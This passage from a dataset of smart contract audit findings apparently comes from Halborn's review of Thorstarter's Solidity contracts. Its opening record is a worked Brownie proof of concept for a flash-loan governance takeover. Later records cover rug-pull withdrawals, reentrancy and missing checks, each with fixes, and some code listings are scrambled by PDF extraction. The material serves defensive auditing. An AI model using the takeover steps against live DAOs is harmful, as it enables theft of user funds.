) -> \" + str ( Voters [0]. votes ( user1 )) ) 35 votes ( user1 ) -> 33 36 >>> print (\" votes ( user2 ) -> \" + str ( Voters [0]. votes ( user2 )) ) 37 votes ( user2 ) -> 16 38 >>> print (\" votes ( attacker ) -> \" + str ( Voters [0]. votes ( attacker )) ) 39 votes ( attacker ) -> 51 40 41 # Attacker creates a proposal that calls Voters . toggleSnapshotter ( DAO ' s address ) 42 >>> encoded_toggleSnapshotter = Voters . signatures [' toggleSnapshotter '] + eth_abi . encode_abi ([ ' address ' ,] , ( DAO [0]. address ,) ). hex () 43 >>> bytes_toggleSnapshotter = to_bytes ( encoded_toggleSnapshotter , ' bytes ') 44 >>> actionBytes = eth_abi . encode_abi ([ ' address ', 'uint ', ' bytes '] , ( Voters [0]. address , 0, bytes_toggleSnapshotter )) . hex () 45 >>> proposalID = DAO [0]. propose (\" Title \", \" Description \", 10000 , 100 , [\" For \", \" Against \"] , [[ actionBytes ], []] , { ' from ': attacker }) 46 >>> proposalID = proposalID . return_value 47 >>> proposalID 48 1 49 50 # Attacker returns the flash loan 51 >>> Voters [0]. unlock (51 , { ' from ': attacker }) 52 53 # Attacker votes for his proposal 54 >>> DAO [0]. vote ( proposalID , 0, { ' from ': attacker }) 55 56 # The other users vote to reject the proposal 57 >>> DAO [0]. vote ( proposalID , 1, { ' from ': user1 }) 58 >>> DAO [0]. vote ( proposalID , 1, { ' from ': user2 }) 59 60 # After 24 hours ... 61 >>> chain . sleep (86401) 62 63 # Attacker executes the self - approved proposal 64 >>> DAO [0]. execute ( proposalID , { ' from ': attacker }) 20 65 Transaction sent : 0 xdb6533a7eeb2426681ac4eab6dc638 ... 66 Nonce : 5 67 Gas price : 0.0 gwei DAO . execute confirmed Gas limit : 6721975 Block : 13061360 Gas used : 63783 (0.95%) 68 69 < Transaction '0 xdb6533a7eeb2426681ac4eab6dc638 ... ' > 70 71 72 # Now another user comes and tries to create a new proposal 73 >>> DAO [0]. propose (\" Title \", \" Description \", 10000 , 100 , [\" For \", \" Against \"] , [[] , []] , { ' from ': user1 }) 74 Transaction sent : 0 x6449063f2cc6b237dd5f7693a76c7e ... 75 Nonce : 3 76 Gas price : 0.0 gwei DAO . propose confirmed ( not snapshotter ) Gas limit : 6721975 Block : 13061361 Gas used : 30712 (0.46%) 77 78 < Transaction '0 x6449063f2cc6b237dd5f7693a76c7e ... ' > Case 2: Take total control of the DAO.sol contract - Manual test: For this case we have followed these steps to take control of the DAO contract: 1. Create a malicious contract called EvilVoters.sol with the same structure and similar code as the current Voters.sol contract 2. Initialize the EvilVoters.sol contract with our own fake tokens 3. Add the DAO.sol contract address as an snapshotter of our malicious contract 4. Perform a flash loan of XRUNEs and lock all those XRUNE tokens so we obtain more than the 50% of the total voting power 5. Create a proposal which calls DAO.setVoters(EvilVoters.sol's address ) 6. Return the flash loan 7. Give it our vote 8. Execute it After the proposal is executed the new voters contract will be our In this contract, we are the only ones that have malicious contract. 21 tokens which give us total control over the DAO contract to propose and execute anything. Listing 4: 100,103,162,165) DAO Contract takeover through DAO.setVoters() (Lines 1 # Deploying test Token contracts ... 2 >>> accounts [0]. deploy ( XRuneToken ) 3 >>> accounts [0]. deploy ( OfferingToken ) 4 5 # Deploying contract Voters . sol - constructor ( address _owner , address _token , address _sushiLpToken ) 6 >>> accounts [0]. deploy ( Voters , accounts [0]. address , XRuneToken [0]. address , OfferingToken [0]. address ) 7 8 # Deploying contract DAO . sol - constructor ( address _voters , uint _minBalanceToPropose , uint _minPercentQuorum , uint _minVotingTime , uint _minExecutionDelay ) 9 >>> accounts [0]. deploy ( DAO , Voters [0]. address , 10 , 0, 0, 0) 10 11 # Adding DAO contract as a snapshotter of Voters . sol 12 >>> Voters [0]. toggleSnapshotter ( DAO [0]. address ) 13 14 # Example users 15 ## user1 33% of voting power 16 ### Giving user 1 33% of the voting power 17 >>> user1 = accounts [1] 18 >>> XRuneToken [0]. transfer ( user1 . address , 33) 19 >>> XRuneToken [0]. approve ( Voters [0]. address , 33 , { ' from ': user1 }) 20 >>> Voters [0]. lock (33 , { ' from ': user1 }) 21 22 ## user2 16% of voting power 23 ### Giving user 2 16% of the voting power 24 >>> user2 = accounts [2] 25 >>> XRuneToken [0]. transfer ( user2 , 16) 26 >>> XRuneToken [0]. approve ( Voters [0]. address , 16 , { ' from ': user2 }) 27 >>> Voters [0]. lock (16 , { ' from ': user2 }) 28 29 ## attacker creates a new Voters . sol contract with his own fake tokens which are FakeToken1 and FakeToken2 30 >>> attacker = accounts [9] 31 ### Deploying FakeToken contracts ... 32 >>> attacker . deploy ( FakeToken1 ) 33 >>> attacker . deploy ( FakeToken2 ) 22 34 35 ### deploying malicious Voters contract ... 36 >>> attacker . deploy ( Voters , attacker . address , FakeToken1 [0]. address , FakeToken2 [0]. address ) 37 38 ### Adding DAO contract as a snapshotter of the malicious Voters . sol 39 >>> Voters [1]. toggleSnapshotter ( DAO [0]. address ) 40 41 ## Voters [0] -> Original voters contract 42 ## Voters [1] -> Malicious voters contract created by the attacker 43 ### Attacker locks 1000000 FakeTokens1 in the malicious voters contract 44 >>> FakeToken1 [0]. transfer ( attacker , 1000000) 45 >>> FakeToken1 [0]. approve ( Voters [1]. address , 1000000 , { ' from ': attacker }) 46 >>> Voters [1]. lock (1000000 , { ' from ': attacker }) 47 >>> print (\" Attacker voting power in the malicious voters contract -> \" + str ( Voters [1]. votes ( attacker )) + \"\\ n \") 48 Attacker voting power in the malicious voters contract -> 1000000 49 50 ## attacker comes and performs a flash loan of XRUNE tokens to get 51% of the voting power in the original voters contract 51 >>> XRuneToken [0]. transfer ( attacker , 51) 52 >>> XRuneToken [0]. approve ( Voters [0]. address , 51 , { ' from ': attacker }) 53 >>> Voters [0]. lock (51 , { ' from ': attacker }) 54 55 # Voting power 56 >>> print () 57 print (\" Voting power in the original voters contract \") 58 print (\" votes ( user1 ) -> \" + str ( Voters [0]. votes ( user1 )) ) 59 print (\" votes ( user2 ) -> \" + str ( Voters [0]. votes ( user2 )) ) 60 print (\" votes ( attacker ) -> \" + str ( Voters [0]. votes ( attacker )) ) 61 print () 62 print (\" Voting power in the malicious voters contract \") 63 print (\" votes ( user1 ) -> \" + str ( Voters [1]. votes ( user1 )) ) 64 print (\" votes ( user2 ) -> \" + str ( Voters [1]. votes ( user2 )) ) 65 print (\" votes ( attacker ) -> \" + str ( Voters [1]. votes ( attacker )) ) 66 print () 67 68 Voting power in the original voters contract 69 votes ( user1 ) -> 33 70 votes ( user2 ) -> 16 23 71 votes ( attacker ) -> 51 72 73 Voting power in the malicious voters contract 74 votes ( user1 ) -> 0 75 votes ( user2 ) -> 0 76 votes ( attacker ) -> 1000000 77 78 # Attacker creates a proposal that calls setVoters ( Malicious voters contract address ) 79 >>> encoded_setVoters = DAO . signatures [ ' setVoters '] + eth_abi . encode_abi ([ ' address ' ,] , ( Voters [1]. address ,) ). hex () 80 >>> bytes_setVoters = to_bytes ( encoded_setVoters , ' bytes ') 81 >>> actionBytes = eth_abi . encode_abi ([ ' address ', 'uint ', ' bytes '] , ( DAO [0]. address , 0, bytes_setVoters )) . hex () 82 >>> proposalID = DAO [0]. propose (\" Title \", \" Description \", 10000 , 100 , [\" For \", \" Against \"] , [[ actionBytes ], []] , { ' from ': attacker }) 83 >>> print (\" ProposalID -> \" + str ( proposalID ) + \"\\ n \") 84 ProposalID -> 1 85 86 # Attacker returns the flash loan . This is done before voting for its own proposal , as the voting power used by the smart contract is the voting power that the users had at the time of the proposal creation 87 >>> Voters [0]. unlock (51 , { ' from ': attacker }) 88 89 # Attacker votes to approve his own proposal 90 >>> DAO [0]. vote ( proposalID , 0, { ' from ': attacker }) 91 92 # The other users vote to reject the proposal 93 >>> DAO [0]. vote ( proposalID , 1, { ' from ': user1 }) 94 >>> DAO [0]. vote ( proposalID , 1, { ' from ': user2 }) 95 96 # After 24 hours ... 97 >>> chain . sleep (86401) 98 99 # Attacker executes the proposal 100 >>> DAO [0]. execute ( proposalID , { ' from ': attacker }) 101 Transaction sent : 0 xca6d0d8e67b51644c81535b2435303e ... 102 Nonce : 12 103 Gas price : 0.0 gwei DAO . execute confirmed Gas limit : 6721975 Block : 13069245 Gas used : 77831 (1.16%) 104 105 < Transaction '0 xca6d0d8e67b51644c81535b2435303e ... ' > 24 106 107 ## Let 's give now a lot of voting power to the user1 and user2 108 >>> XRuneToken [0]. transfer ( user1 , 500000000 e10 ) 109 >>> XRuneToken [0]. approve ( Voters [0]. address , 500000000 e10 , { ' from ': user1 }) 110 >>> Voters [0]. lock (500000000 e10 , { ' from ': user1 }) 111 >>> XRuneToken [0]. transfer ( user2 , 500000000 e10 ) 112 >>> XRuneToken [0]. approve ( Voters [0]. address , 500000000 e10 , { ' from ': user2 }) 113 >>> Voters [0]. lock (500000000 e10 , { ' from ': user2 }) 114 115 # Voting power 116 >>> print () 117 print (\" Voting power in the original voters contract \") 118 print (\" votes ( user1 ) -> \" + str ( Voters [0]. votes ( user1 )) ) 119 print (\" votes ( user2 ) -> \" + str ( Voters [0]. votes ( user2 )) ) 120 print (\" votes ( attacker ) -> \" + str ( Voters [0]. votes ( attacker )) ) 121 print () 122 print (\" Voting power in the malicious voters contract \") 123 print (\" votes ( user1 ) -> \" + str ( Voters [1]. votes ( user1 )) ) 124 print (\" votes ( user2 ) -> \" + str ( Voters [1]. votes ( user2 )) ) 125 print (\" votes ( attacker ) -> \" + str ( Voters [1]. votes ( attacker )) ) 126 print () 127 128 Voting power in the original voters contract 129 votes ( user1 ) -> 5000000000000000033 130 votes ( user2 ) -> 5000000000000000016 131 votes ( attacker ) -> 0 132 133 Voting power in the malicious voters contract 134 votes ( user1 ) -> 0 135 votes ( user2 ) -> 0 136 votes ( attacker ) -> 1000000 137 138 ## attacker creates a new proposal to setMinBalanceToPropose to 1000000 139 >>> encoded_setMinBalanceToPropose = DAO . signatures [' setMinBalanceToPropose '] + eth_abi . encode_abi ([ ' uint256 ' ,] , (1000000 ,) ). hex () 140 >>> bytes_setMinBalanceToPropose = to_bytes ( encoded_setMinBalanceToPropose ,' bytes ') 141 >>> actionBytes = eth_abi . encode_abi ([ ' address ', 'uint ', ' bytes '] , ( DAO [0]. address , 0, bytes_setMinBalanceToPropose )) . hex () 142 >>> proposalID = DAO [0]. propose (\" Title \", \" Description \", 10000 , 25 100 , [\" For \", \" Against \"] , [[ actionBytes ], []] , { ' from ': attacker }) 143 >>> proposalID = proposalID . return_value 144 >>> print (\" Second proposal created by the attacker - ProposalID -> \" + str ( proposalID ) + \"\\ n \") 145 Second proposal created by the attacker - ProposalID -> 2 146 147 # Attacker votes to approve it 148 >>> DAO [0]. vote ( proposalID , 0, { ' from ': attacker }) 149 150 # User1 and user2 vote to reject it 151 >>> DAO [0]. vote ( proposalID , 0, { ' from ': user1 }) 152 >>> DAO [0]. vote ( proposalID , 0, { ' from ': user2 }) 153 154 # Finish the voting period 155 >>> chain . sleep (86401) 156 157 # We check the minBalanceToPropose before executing the proposal 158 >>> print (\" minBalanceToPropose before executing the proposal -> \" + str ( DAO [0]. minBalanceToPropose () ) + \"\\ n \") 159 minBalanceToPropose before executing the proposal -> 10 160 161 # Execute the proposal 162 >>> DAO [0]. execute ( proposalID , { ' from ': attacker }) 163 Transaction sent : 0 x5cdb022231acb822c48c4ffe8c58aab675 ... 164 165 Gas price : 0.0 gwei DAO . execute confirmed Gas limit : 6721975 Block : 13069256 Nonce : 15 Gas used : 76851 (1.14%) 166 167 < Transaction '0 x5cdb022231acb822c48c4ffe8c58aab675 ... ' > 168 169 # Get the value of minBalanceToPropose after executing the proposal 170 >>> print (\" minBalanceToPropose after executing the proposal -> \" + str ( DAO [0]. minBalanceToPropose () )) 171 minBalanceToPropose after executing the proposal -> 1000000 Risk Level: Likelihood - 3 Impact - 5 26 Recommendation: In the current Voters.sol contract, the tokens locked should take a fixed If a malicious user period of time before they grant voting power. performs a flash loan of XRUNE tokens and locks them, they will not get their voting power increased before they have to return the flash loan. So, it is recommended not allowing to lock() and unlock() XRUNE in the same transaction. Remediation Plan: SOLVED: Thorstarter Team rightly implemented a fix to mitigate the risk of flash loans by not allowing to lock() unlock() XRUNE in the same transaction. 27 ",
        "labels": [
            "Halborn",
            "Thorstarter",
            "Severity: High"
        ]
    },
    {
        "title": "FINALWITHDRAW FUNCTION MISSING REQUIRE STATEMENT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Thorstarter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "The contracts Sale.sol and SaleFloating.sol have a function called finalWithdraw() which allows the owner to extract all the tokens. This function allows the owner of the contract to perform a rug pull as he would be able to retrieve all the tokens at any given time. Code Location: Listing 5: Sale.sol 249 function finalWithdraw ( uint _paymentAmount , uint _offeringAmount ) public onlyOwner { 250 require ( _paymentAmount <= paymentToken . balanceOf ( address ( this )) , ' not enough payment token '); 251 require ( _offeringAmount <= offeringToken . balanceOf ( address ( this 252 253 254 255 256 257 258 )) , ' not enough offerring token '); if ( _paymentAmount > 0) { paymentToken . safeTransfer ( address ( msg . sender ) , _paymentAmount ) ; totalAmountWithdrawn += _paymentAmount ; require ( totalAmountWithdrawn <= raisingAmount , ' can only widthdraw what is owed '); } if ( _offeringAmount > 0) { offeringToken . safeTransfer ( address ( msg . sender ) , _offeringAmount ); } 259 260 } Listing 6: SaleFloating.sol 220 function finalWithdraw ( uint _paymentAmount , uint _offeringAmount ) public onlyOwner { 221 require ( _paymentAmount <= paymentToken . balanceOf ( address ( this )) , ' not enough payment token '); 28 222 require ( _offeringAmount <= offeringToken . balanceOf ( address ( this 223 224 225 226 227 )) , ' not enough offerring token '); if ( _paymentAmount > 0) { paymentToken . safeTransfer ( address ( msg . sender ) , _paymentAmount ) ; } if ( _offeringAmount > 0) { offeringToken . safeTransfer ( address ( msg . sender ) , _offeringAmount ); } 228 229 } Risk Level: Likelihood - 2 Impact - 5 Recommendation: finalWithdraw() function should have a require statement that does not allow the withdraw unless the redeeming period has been completed. In order to achieve this, this could be a possible implementation: Listing 7: Example (Lines 6,7,9,11) 1 uint public startBlock ; 2 // The block number when sale ends 3 uint public endBlock ; 4 // The block number when tokens are redeemable 5 uint public tokensBlock ; 6 // The block number that sets the end of the redeeming period 7 uint public tokensEndBlock ; 8 9 // New finalWithdraw () function 10 function finalWithdraw ( uint _paymentAmount , uint _offeringAmount ) public onlyOwner { 11 require ( block . number > tokensEndBlock , ' redeeming period is not over yet '); 12 require ( _paymentAmount <= paymentToken . balanceOf ( address ( this )) , ' not enough payment token '); 29 13 require ( _offeringAmount <= offeringToken . balanceOf ( address ( this 14 15 16 17 18 19 20 )) , ' not enough offerring token '); if ( _paymentAmount > 0) { paymentToken . safeTransfer ( address ( msg . sender ) , _paymentAmount ) ; totalAmountWithdrawn += _paymentAmount ; require ( totalAmountWithdrawn <= raisingAmount , ' can only withdraw what is owed '); } if ( _offeringAmount > 0) { offeringToken . safeTransfer ( address ( msg . sender ) , _offeringAmount ); } 21 22 } tokensEndBlock would set when the redeeming period is finished and then, in the finalWithdraw() function, there would be a require statement that would check that the redeeming period is completed in order to withdraw the tokens. Remediation Plan: SOLVED: Thorstarter Team added a requirement so the function finalWithdraw () can only be called if the sale have not started yet or if the sale have finished at least 7 days ago. 30 ",
        "labels": [
            "Halborn",
            "Thorstarter",
            "Severity: Medium"
        ]
    },
    {
        "title": "SALE DATE CAN BE MODIFIED ONCE STARTED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Thorstarter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "The contracts Sale.sol and SaleFloating.sol have the following state variables: Listing 8: Sale.sol (Lines 42,44) 41 // The block number when sale starts 42 uint public startBlock ; 43 // The block number when sale ends 44 uint public endBlock ; 45 // The block number when tokens are redeemable 46 uint public tokensBlock ; 47 // Total amount of raising tokens that need to be raised 48 uint public raisingAmount ; These variables set the start and the end date of the Sale. Once the sale is started the startBlock variable can be modified with the function setStartBlock(). This means that if the new startBlock is higher than the current block.number the sale schedule can be modified. Thorstarter mentioned this was intended, as a way to pause deposits/withdrawals or extend the time before tokens are claimable in case the project needed more time to sort issues out. For this case, Halborn believes that a better approach could be using a modifier like notPaused for all these deposit/withdrawals functions and never allowing the modification of the sale schedule, once it was already started. On the other hand, the state variables startBlock, endBlock, tokensBlock and raisingAmount should not be modified once the sale has started, for that reason the setter methods setStartBlock(), setEndBlock() and setTokensBlock() should be edited so they require that the sale has not started to be executed. Otherwise a malicious owner/keeper could change the schedule of the sale. This vulnerability is also related to HAL-04. Both vulnerabilities 31 The finalWithdraw should be fixed to ensure a correct functionality. () function suggested fix, would be useless, and could be bypassed, if the start/end/redeeming dates could be modified by the owner after the sale had started. Code Location: Listing 9: Sale.sol (Lines 87,88,96,97) startBlock = _block ; _validateBlockParams () ; 131 function setStartBlock ( uint _block ) public onlyOwnerOrKeeper { 132 133 134 } 135 136 function setEndBlock ( uint _block ) public onlyOwnerOrKeeper { 137 138 139 } 140 141 function setTokensBlock ( uint _block ) public onlyOwnerOrKeeper { 142 143 144 } endBlock = _block ; _validateBlockParams () ; tokensBlock = _block ; _validateBlockParams () ; Risk Level: Likelihood - 1 Impact - 5 Recommendation: Use a modifier like notPaused for all these deposit/withdrawals functions. Functions setStartBlock(), setEndBlock() and setTokensBlock() should have Once a require statement that checks that the sale has not started. started the sale schedule should never be modified. 32 Remediation Plan: SOLVED: Thorstarter Team decided to remove all the setter functions which allowed changes to the sale parameters. Functions setStartBlock(), setEndBlock() and setTokensBlock() were removed. The sale schedule can now only be set in the constructor. 33 ",
        "labels": [
            "Halborn",
            "Thorstarter",
            "Severity: Medium"
        ]
    },
    {
        "title": "PARTY CAN BE LEFT WITHOUT ANY OWNER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Thorstarter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "The contract LpTokenVesting.sol contains the function toggleOwner(). This function could leave a party without any owner if its wrongly executed. This means that the party would not be able to claim their vested tokens. Code Location: Vulnerable code Listing 10: LpTokenVesting.sol 63 function toggleOwner ( uint party , address owner ) public { 64 65 66 67 68 } Party storage p = parties [ party ]; require ( p. owners [ msg . sender ], \" not an owner of this party \" ); p. owners [ owner ] = ! p. owners [ owner ]; owners [ owner ] = p. owners [ owner ]; Listing 11: Test done with brownie 1 # Check if a party can be left without an owner 2 def test_lptoken_4 () : 3 4 chain . snapshot () print (\" owner_account - PartyOwner () ? -> \" + str ( LpTokenVesting [0]. partyOwner (0 , owner_account . address )) ) LpTokenVesting [0]. toggleOwner (0 , owner_account . address ,{ ' from ': owner_account . address }) print (\" owner_account - PartyOwner () ? -> \" + str ( LpTokenVesting [0]. partyOwner (0 , owner_account . address )) ) chain . revert () 5 6 7 Listing 12: Output of the test 1 owner_account - PartyOwner () ? -> True 2 34 3 Transaction sent : 0 xcf387d3bf616845cf90081ef28e50c0f266d0c2bcaf1ede4b6354d0727ac61cf 4 5 Gas price : 0.0 gwei LpTokenVesting . toggleOwner confirmed Gas limit : 6721975 Nonce : 10 Block : 13037160 Gas used : 17408 (0.26%) 6 7 owner_account - PartyOwner () ? -> False Risk Level: Likelihood - 2 Impact - 3 Recommendation: Use OpenZeppelin Access Control library to manage the different roles of the contracts. Using this OpenZeppelin library the roles can be granted and revoked dynamically via the grantRole and revokeRole functions. Each role has an associated admin role, and only accounts that have a roles admin role can call grantRole and revokeRole. Remediation Plan: SOLVED: Thorstarter Team added a require statement disallowing the owner to disable his own access. First, the owner can promote someone else and only then they can disable the access. 35 ",
        "labels": [
            "Halborn",
            "Thorstarter",
            "Severity: Low"
        ]
    },
    {
        "title": "DOS WITH BLOCK GAS LIMIT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Thorstarter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "When smart contracts are deployed or functions inside them are called, the execution of these actions always require a certain amount of gas, based on how much computation is needed to complete them. The Ethereum network specifies a block gas limit and the sum of all transactions included in a block cannot exceed the threshold. Programming patterns that are harmless in centralized applications can lead to Denial of Service conditions in smart contracts when the cost of executing a function exceeds the block gas limit. In the contract LpTokenVestingKeeper.sol, the function run() iterates over an array of vesters of unknown size. If this array is big enough, the transaction could reach the block gas limit and would not be completed. Code Location: Listing 13: LpTokenVestingKeeper.sol (Lines 81) require ( shouldRun () , \" should not run \" ); lastRun = block . timestamp ; for ( uint i = 0; i < lpVestersCount ; i ++) { 78 function run () external { 79 80 81 82 83 84 85 ILpTokenVesting vester = ILpTokenVesting ( lpVesters [i ]) ; uint claimable = vester . claimable (0) ; if ( claimable > 0) { vester . claim (0) ; Risk Level: Likelihood - 2 Impact - 3 36 Recommendation: Actions that require looping across the entire data structure should be avoided. If you absolutely must loop over an array of unknown size, then you should plan for it to potentially take multiple blocks, and therefore require multiple transactions. Remediation Plan: RISK ACCEPTED: Thorstarter Team accepts this risk as they will be the only keepers of this contract and will avoid adding too many vesting contracts in that array. 37 ",
        "labels": [
            "Halborn",
            "Thorstarter",
            "Severity: Low"
        ]
    },
    {
        "title": "LACK OF ZERO ADDRESS CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Thorstarter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "Every There is no validation of the addresses anywhere in the code. address should be validated and checked that is different than zero. This issue is present in most of the constructors and functions that use addresses as parameters. Code Location examples: Listing 14: Sale.sol (Lines 87,88,96,97) IERC20 _paymentToken , IERC20 _offeringToken , uint _startBlock , uint _endBlock , uint _tokensBlock , uint _offeringAmount , uint _raisingAmount , uint _perUserCap , address _owner , address _keeper ) { 75 constructor ( 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 paymentToken = _paymentToken ; offeringToken = _offeringToken ; startBlock = _startBlock ; endBlock = _endBlock ; tokensBlock = _tokensBlock ; offeringAmount = _offeringAmount ; raisingAmount = _raisingAmount ; perUserCap = _perUserCap ; totalAmount = 0; owner = _owner ; keeper = _keeper ; _validateBlockParams () ; require ( _paymentToken != _offeringToken , ' payment != offering '); 38 100 101 102 } require ( _offeringAmount > 0, ' offering > 0 '); require ( _raisingAmount > 0, ' raising > 0 '); Listing 15: SaleFloating.sol (Lines 90,91,99,100) IERC20 _paymentToken , IERC20 _offeringToken , uint _startBlock , uint _endBlock , uint _tokensBlock , uint _startPrice , uint _priceVelocity , uint _offeringAmount , uint _perUserCap , address _owner , address _keeper 77 constructor ( 78 79 80 81 82 83 84 85 86 87 88 89 ) { 90 91 92 93 94 95 96 97 98 99 100 101 102 paymentToken = _paymentToken ; offeringToken = _offeringToken ; startBlock = _startBlock ; endBlock = _endBlock ; tokensBlock = _tokensBlock ; startPrice = _startPrice ; priceVelocity = _priceVelocity ; offeringAmount = _offeringAmount ; perUserCap = _perUserCap ; owner = _owner ; keeper = _keeper ; _validateBlockParams () ; require ( _paymentToken != _offeringToken , ' payment != offering ' ); require ( _priceVelocity > 0, ' price velocity > 0 '); require ( _offeringAmount > 0, ' offering amount > 0 '); 103 104 105 } Listing 16: EmissionsSplitter.sol (Lines 44,45,46,47) 41 constructor ( address _token , uint _emissionsStart , address _dao , address _team , address _investors , address _ecosystem ) { token = IERC20 ( _token ); emissionsStart = _emissionsStart ; 42 43 39 dao = _dao ; team = _team ; investors = _investors ; ecosystem = _ecosystem ; 44 45 46 47 48 } Listing 17: EmissionsPrivateDispenser.sol (Lines 30) 26 constructor ( address _token , address [] memory investors , uint [] memory percentages ) { token = IERC20 ( _token ); require ( investors . length == percentages . length ); for ( uint i = 0; i < investors . length ; i ++) { investorsPercentages [ investors [ i ]] = percentages [i ]; emit ConfigureInvestor ( investors [ i ], percentages [i ]) ; } 27 28 29 30 31 32 33 } Listing 18: VotersInvestmentDispenser.sol (Lines 28,29) 27 28 29 30 constructor ( address _xruneToken , address _dao ) { xruneToken = IERC20 ( _xruneToken ); dao = IDAO ( _dao ); } Risk Level: Likelihood - 3 Impact - 2 Recommendation: Validate that every address input is different than zero. Remediation Plan: SOLVED: constructors. Thorstarter Team added address validation into all the 40 ",
        "labels": [
            "Halborn",
            "Thorstarter",
            "Severity: Low"
        ]
    },
    {
        "title": "VIOLATION OF CHECK, EFFECTS, INTERACTIONS PATTERN",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Thorstarter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "In the contracts Sale.sol and SaleFloating.sol the check, effects, interactions pattern is not being followed in some functions and this could open an attack vector for reentrancy attacks or code inconsistencies. The finalWithdraw() function is already vulnerable to reentrancy and should be corrected. Code Location: Sales.sol Listing 19: Sale.sol (Lines 254) 249 function finalWithdraw ( uint _paymentAmount , uint _offeringAmount ) public onlyOwner { 250 require ( _paymentAmount <= paymentToken . balanceOf ( address ( this )) , ' not enough payment token '); 251 require ( _offeringAmount <= offeringToken . balanceOf ( address ( this 252 253 254 255 256 257 258 )) , ' not enough offerring token '); if ( _paymentAmount > 0) { paymentToken . safeTransfer ( address ( msg . sender ) , _paymentAmount ) ; totalAmountWithdrawn += _paymentAmount ; require ( totalAmountWithdrawn <= raisingAmount , ' can only widthdraw what is owed '); } if ( _offeringAmount > 0) { offeringToken . safeTransfer ( address ( msg . sender ) , _offeringAmount ); } 259 260 } 41 Listing 20: Sale.sol (Lines 187,199) 179 function harvestRefund () public nonReentrant { 180 181 require ( block . number > endBlock , ' not harvest time '); require ( userInfo [ msg . sender ]. amount > 0, ' have you participated ? '); 182 require (! userInfo [ msg . sender ]. claimedRefund , ' nothing to harvest '); paymentToken . safeTransfer ( address ( msg . sender ) , amount ); uint amount = getRefundingAmount ( msg . sender ); if ( amount > 0) { } userInfo [ msg . sender ]. claimedRefund = true ; emit HarvestRefund ( msg . sender , amount ); 183 184 185 186 187 188 189 } 190 191 function harvestTokens () public nonReentrant { 192 193 require ( block . number > tokensBlock , ' not harvest time '); require ( userInfo [ msg . sender ]. amount > 0, ' have you participated ? '); 194 require (! userInfo [ msg . sender ]. claimedTokens , ' nothing to harvest '); uint amount = getOfferingAmount ( msg . sender ); if ( amount > 0) { offeringToken . safeTransfer ( address ( msg . sender ) , amount ); } userInfo [ msg . sender ]. claimedTokens = true ; emit HarvestTokens ( msg . sender , amount ); 195 196 197 198 199 200 201 } SaleFloating.sol Listing 21: SaleFloating.sol (Lines 182,183,199) 164 function harvestTokens () public nonReentrant { 165 166 167 require (! paused , ' paused '); require ( block . number > tokensBlock , ' not harvest time '); require ( userInfo [ msg . sender ]. amount > 0, ' have you participated ? '); 168 require (! userInfo [ msg . sender ]. claimedTokens , ' nothing to harvest '); uint amount = getOfferingAmount ( msg . sender ); if ( amount > 0) { offeringToken . safeTransfer ( address ( msg . sender ) , amount ); 169 170 171 42 } userInfo [ msg . sender ]. claimedTokens = true ; emit HarvestTokens ( msg . sender , amount ); 172 173 174 175 } Risk Level: Likelihood - 2 Impact - 2 Recommendation: Follow the check, effects, interactions pattern. For the finalWithdraw() function another suggestion is using the nonReentrant modifier. Remediation Plan: Thorstarter Team SOLVED: the check,effects,interactions pattern into the functions finalWithdraw(), harvestRefund() and harvestTokens(). successfully implemented has 43 ",
        "labels": [
            "Halborn",
            "Thorstarter",
            "Severity: Low"
        ]
    },
    {
        "title": "INCOMPATIBILITY WITH INFLATIONARY TOKENS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Thorstarter_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "In multiple functions Thorstarter uses OpenZeppelins safeTransferFrom and safeTransfer to handle the token transfers. These functions call transferFrom and transfer internally in the token contract to actually execute the transfer. However, since the actual amount transferred ie. the delta of previous (before transfer) and current (after transfer) balance is not verified, a malicious user may list a custom ERC20 token with the transferFrom or transfer function modified in such a way that it e.g. does not transfer any tokens at all and the attacker is still going to have their liquidity pool tokens minted anyway. Code Location: Sale.sol Listing 22: Sale.sol 169 paymentToken . safeTransferFrom ( address ( msg . sender ) , address ( this ) , _amount ); Listing 23: Sale.sol 185 paymentToken . safeTransfer ( address ( msg . sender ) , amount ); Listing 24: Sale.sol 197 offeringToken . safeTransfer ( address ( msg . sender ) , amount ); Listing 25: Sale.sol (Lines 253,258) 249 function finalWithdraw ( uint _paymentAmount , uint _offeringAmount ) public onlyOwner { 44 250 require ( _paymentAmount <= paymentToken . balanceOf ( address ( this )) , ' not enough payment token '); 251 require ( _offeringAmount <= offeringToken . balanceOf ( address ( this 252 253 254 255 256 257 258 )) , ' not enough offerring token '); if ( _paymentAmount > 0) { paymentToken . safeTransfer ( address ( msg . sender ) , _paymentAmount ) ; totalAmountWithdrawn += _paymentAmount ; require ( totalAmountWithdrawn <= raisingAmount , ' can only widthdraw what is owed '); } if ( _offeringAmount > 0) { offeringToken . safeTransfer ( address ( msg . sender ) , _offeringAmount ); } 259 260 } SaleFloating.sol Listing 26: SaleFloating.sol 180 paymentToken . safeTransferFrom ( address ( msg . sender ) , address ( this ) , _amount ); Listing 27: SaleFloating.sol 197 offeringToken . safeTransfer ( address ( msg . sender ) , amount ); Listing 28: SaleFloating.sol (Lines 224,227) 220 function finalWithdraw ( uint _paymentAmount , uint _offeringAmount ) public onlyOwner { 221 require ( _paymentAmount <= paymentToken . balanceOf ( address ( this )) , ' not enough payment token '); 222 require ( _offeringAmount <= offeringToken . balanceOf ( address ( this )) , ' not enough offerring token '); if ( _paymentAmount > 0) { paymentToken . safeTransfer ( address ( msg . sender ) , _paymentAmount ) ; } if ( 